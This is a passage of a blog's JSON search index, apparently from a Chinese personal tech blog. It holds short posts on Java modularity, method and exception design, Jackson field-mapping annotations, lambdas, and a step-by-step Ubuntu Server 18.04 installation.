模块化基础","slug":"Java/java-模块化基础","date":"2019-08-22T12:04:00.000Z","updated":"2021-06-20T05:09:18.401Z","comments":true,"path":"2019/08/22/Java/java-模块化基础/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/java-%E6%A8%A1%E5%9D%97%E5%8C%96%E5%9F%BA%E7%A1%80/","excerpt":"Java 9 模块化收益 提升平台伸缩性 提升平台完整性","text":"Java 9 模块化收益 提升平台伸缩性 提升平台完整性 提升性能 模块化强封装性 并非所有 public class 都可以被运用，需要 exports 来配合 exports 所配置的 package 下必须要有 Class 负面问题 对人的要求很高（对 Class 透明化） 必须了解相关的 module-info.java 需要了解某些类的依赖 需要了解某些类的职责 个人观点 收益不大，代价不小 对团队要求极高，容易出现互喷的情况 java 9 之前采用 jar 文件管理，java 9 模块化之后，变成了 module-info.java 管理，还需要考虑与 Maven 依赖管理如何配合","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 面向过程","slug":"Java/java-面向过程","date":"2019-08-22T12:04:00.000Z","updated":"2021-06-20T05:09:18.333Z","comments":true,"path":"2019/08/22/Java/java-面向过程/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/java-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/","excerpt":"核心要素 数据结构：原生类型、对象类型、数组类型、集合类型","text":"核心要素 数据结构：原生类型、对象类型、数组类型、集合类型 方法调用：访问性、返回类型、方法参数、异常等 执行流程：赋值、逻辑、迭代（循环）、递归等JAVA 中只有原生类型、对象类型 面向对象基本特性 封装性 派生性 多态性 面向对象设计模式 GOF 23：构建、结构、行为 方法设计：名称、访问性、参数、返回类型、异常 泛型设计：类级别、方法级别 异常设计：层次性、传播性 方法设计 单元：一个类或者一组类（组件） 类采用名词结构 动词过去式+名词 ContextRefreshedEven 动词 ing+名词 linitializingBean 形容词+名称 ConfigurableApplicationContext 执行：某个方法 方法命名：动词 execute callback run 方法参数：名词 异常： 根（顶层）异常 Throwable check 类型：Execption uncheck 类型：RuntimeException 不常见：Error java 1.4 java.lang.StackTraceElement 添加异常的原因（cause） 反模式：吞掉某个异常 性能：注意 fillInStackTrace() 方法开销,避免异常咱掉的深度 方法 1：JVM 参数控制栈深度（物理屏蔽） 方法 2：logback 日志框架控制堆栈输出深度（逻辑屏蔽） 泛型设计java 泛型属于编译时处理，运行时擦写。如果确认了泛型的类型，则用 T，否则用 ?","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"JsonSon 实体类与 json 字符串不匹配","slug":"Java/json2Pojo","date":"2019-08-21T23:07:15.000Z","updated":"2021-06-20T05:09:18.633Z","comments":true,"path":"2019/08/22/Java/json2Pojo/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/json2Pojo/","excerpt":"字段名与属性名不匹配","text":"字段名与属性名不匹配 在字段上加 JsonProperty 注解 value 对应 json 字符串 12@JsonProperty(value = &quot;isebookon&quot;)private Integer ebookon; 类字段缺少 json 字符串对应的列在类上添加 @JsonIgnoreProperties 注解 12@JsonIgnoreProperties(ignoreUnknown = true)public class TbUser&#123;&#125;","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Json","slug":"Json","permalink":"https://www.shanghua.live/tags/Json/"}]},{"title":"Lambda 表达式","slug":"Java/lambda","date":"2019-08-21T23:07:00.000Z","updated":"2021-06-20T05:12:17.304Z","comments":true,"path":"2019/08/22/Java/lambda/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/lambda/","excerpt":"基本特点 流程编排清晰 函数类型编程","text":"基本特点 流程编排清晰 函数类型编程 改善代码臃肿 兼容接口升级 编程局限Contents 单一抽象方法 Lambda 调试苦难 Stream API 操作能力有限 函数式接口基本特性 所有函数式接口都引用一段执行代码 函数式接口没有固定的类型，固定模式(SCFP = Supplier + Consumer + Function + Predicate) + Action 利用方法引用来实现模型匹配","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"Ubuntu Server 18.04 X64 安装","slug":"Linux/Ubuntu-install","date":"2019-08-21T22:50:24.000Z","updated":"2021-06-20T05:11:38.603Z","comments":true,"path":"2019/08/22/Linux/Ubuntu-install/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Linux/Ubuntu-install/","excerpt":"安装准备","text":"安装准备 1.Ubuntu 镜像准备，下载地址 这里使用的是阿里镜像站的镜像地址 开始安装选择语言 直接回车，选择 English 选择键盘布局 这里直接默认 Done 选择系统类型选择系统类型，第一个是安装 Ubuntu 另外两个是附带云功能的，我们不需要 直接回车，选择第一个 选择网卡我这里是 ens33，其他电脑可能有不同，不过都是 en 开头的 直接回车 选择 IP 代理 这里直接回车，不用填 选择镜像地址 这里我们可以输入阿里云镜像地址，这样后面下载东西会快很多 1http://mirrors.aliyun.com/ubuntu/ 把默认值删掉，输入阿里地址。输入后变成这样 Done 下一步 文件系统设置 这里一定要选择第二个，带 LVM （逻辑卷管理） 的，回车 选择安装磁盘 只有一个，直接回车下一步 磁盘分区，这里需要注意一下 这里有一个 14.996G free space，这怎么行，我们选择 ubuntu-lv 回车选择 Edit 然后将其改为 18.996G，也就是 max 后面的值 然后选择 save 回车，然后我们就会发现 free space 没得了，完美 然后 done 回车，这时候会弹出一个框，我们选择 continue 即可 填写用户名密码 填写完成，shanghua 是我的网名 这里密码一定要记住，不然忘记了就完蛋了 SSH 设置 这里按一下空格选中安装 SSH 服务 Done 不知道是什么页面 不用管直接 Done 最后然后等一小会就会出来这个页面 这里选择 Reboot Now 重启就完成了，重启就进入系统了","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"}]}],"categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"},{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"},{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"},{"name":"Vim","slug":"Vim","permalink":"https://www.shanghua.live/tags/Vim/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"},{"name":"git","slug":"git","permalink":"https://www.shanghua.live/tags/git/"},{"name":"IDEA","slug":"IDEA","permalink":"https://www.shanghua.live/tags/IDEA/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://www.shanghua.live/tags/elasticsearch/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://www.shanghua.live/tags/MongoDB/"},{"name":"k8","slug":"k8","permalink":"https://www.shanghua.live/tags/k8/"},{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"},{"name":"Python","slug":"Python","permalink":"https://www.shanghua.live/tags/Python/"},{"name":"算法","slug":"算法","permalink":"https://www.shanghua.live/tags/%E7%AE%97%E6%B3%95/"},{"name":"Json","slug":"Json","permalink":"https://www.shanghua.live/tags/Json/"}]}